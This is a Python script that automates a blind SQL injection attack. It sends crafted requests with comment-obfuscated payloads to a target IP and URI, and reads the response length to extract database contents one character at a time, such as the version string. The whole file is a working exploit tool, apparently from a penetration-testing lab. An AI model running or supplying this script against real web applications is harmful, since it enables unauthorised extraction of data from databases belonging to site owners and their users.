import sys
import re
import requests

class colorterm:
    ENDC = '\033[0m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'

def response(headers, content):
    print("Response Headers:")
    print(headers, '\n')
    print("Response Content:")
    print(colorterm.GREEN + content, '\n' + colorterm.ENDC)

def search_blind_sqli(ip, uri, inj_str):
    for i in range(32, 126):
        repl    = inj_str.replace("[CHAR]", str(i))
        target  = uri %(ip, repl)
        r       = requests.get(target)
        
        content_length = int(r.headers['Content-Length'])

        if (content_length > 20):
            return i

    return None

def db_extractor(r, ip, uri, qr_inj):
    extracted = ""

    for i in range(1, r):
        injection_string = "test'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/or/**/1='" %(qr_inj,i)
        search_blind = search_blind_sqli(ip, uri, injection_string)

        try:
            extracted += chr(search_blind)
            extracted_char = chr(search_blind)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        except:
            print("\n(+) Found a NoneType. Nothing more to do...")
            break

    if extracted_char is not None:
        print(colorterm.WARNING + "\n(+) You've found something interesting!" + colorterm.ENDC)
        print("(+) done!\n")
    else:
        print("\(+) Nothing found...")
    
    return extracted


def main():
    if len(sys.argv) != 4:
        print(f"(+) usage: {sys.argv[0]} <target> <uri> <injection_string>")
        print(f"(+) eg: {sys.argv[0]} 192.168.150.103 \"test/q?=\" \"select/**/version()\"")
        print(colorterm.FAIL + "(+) Payload must be a valid SQL query - ex: SELECT VERSION()" + colorterm.ENDC)
        sys.exit(-1)

    ip, uri, injection_string = sys.argv[1], sys.argv[2], sys.argv[3]

    print("(+) Retrieving database version...")
    db_extractor(20, ip, uri, injection_string)


if __name__ == "__main__":
    main()
